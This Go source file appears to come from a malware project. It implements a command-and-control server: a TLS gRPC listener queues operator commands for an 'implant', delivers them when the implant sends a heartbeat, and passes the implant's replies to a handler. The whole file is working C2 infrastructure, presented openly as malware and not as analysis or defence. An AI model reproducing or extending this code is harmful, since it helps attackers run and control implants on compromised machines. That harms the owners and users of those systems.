package basic_tcp_network

import (
	"context"
	"fmt"
	"malware/common/messages"
	"net"
	"os"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
)

var server *grpc.Server

type network struct {
	queue       chan *messages.CheckCmdReply // Queue of commands to send to implant
	handleReply func(*messages.CheckCmdRequest)
}

func InitNetwork(port int, handleReply func(*messages.CheckCmdRequest), queue chan *messages.CheckCmdReply) {
	creds, err := credentials.NewServerTLSFromFile(os.Args[1], os.Args[2])

	if err != nil {
		panic(err)
	}

	host := fmt.Sprintf(":%d", port)
	listener, err := net.Listen("tcp", host)

	if err != nil {
		panic(err)
	}

	defer listener.Close()

	server = grpc.NewServer(grpc.Creds(creds))

	messages.RegisterMalwareServer(server, &network{queue, handleReply})

	server.Serve(listener)
}

func KillNetwork() {
	server.Stop()
}

// Server listening function
// Called automagically by grpc
func (network *network) CheckCommandQueue(ctx context.Context, req *messages.CheckCmdRequest) (*messages.CheckCmdReply, error) {
	if req.GetHeartbeat() > 0 {
		select {
		case msg, ok := <-network.queue:
			if ok {
				return msg, nil
			} else {
				panic("network Message Queue closed")
			}
		default:
			// No message in queue
		}
	} else {
		network.handleReply(req)
	}

	// We don't have anything to actually send back, so lets just reply with a heartbeat
	return messages.C2_heartbeat(time.Now().Unix()), nil
}
